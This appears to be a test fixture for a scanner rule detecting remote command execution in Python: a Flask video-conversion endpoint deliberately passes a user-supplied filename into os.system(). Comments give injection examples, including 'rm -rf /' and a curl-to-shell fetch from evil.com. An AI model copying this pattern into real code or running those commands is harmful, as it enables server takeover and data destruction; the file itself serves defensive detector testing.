# Test: positive for rule RCE-PY-001
# Expected: should_trigger
# Category: rce
# Language: python

"""
Media conversion endpoint that invokes ffmpeg through os.system().
VULNERABLE: the user-supplied filename is interpolated directly into
the shell command, allowing command injection (e.g. '; rm -rf /').
"""

import os
import logging
from pathlib import Path
from flask import Flask, request, jsonify

app = Flask(__name__)
logger = logging.getLogger(__name__)

UPLOAD_DIR = Path("/var/uploads")
OUTPUT_DIR = Path("/var/converted")


@app.route("/api/convert", methods=["POST"])
def convert_video():
    """Convert an uploaded video file to MP4 using ffmpeg."""
    filename = request.form.get("filename")
    if not filename:
        return jsonify({"error": "Missing 'filename' field"}), 400

    input_path = UPLOAD_DIR / filename
    output_path = OUTPUT_DIR / f"{Path(filename).stem}.mp4"

    if not input_path.exists():
        return jsonify({"error": "Source file not found"}), 404

    # VULNERABLE: user-controlled filename is injected into a shell command
    # without escaping.  An attacker can supply a filename like
    #   video.avi; curl http://evil.com/shell.sh | sh
    # to execute arbitrary commands on the server.
    cmd = f"ffmpeg -i {input_path} {output_path}"
    logger.info("Running conversion: %s", cmd)
    exit_code = os.system(cmd)

    if exit_code != 0:
        logger.error("ffmpeg exited with code %d", exit_code)
        return jsonify({"error": "Conversion failed"}), 500

    return jsonify({
        "message": "Conversion complete",
        "output": str(output_path),
    })


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=False)
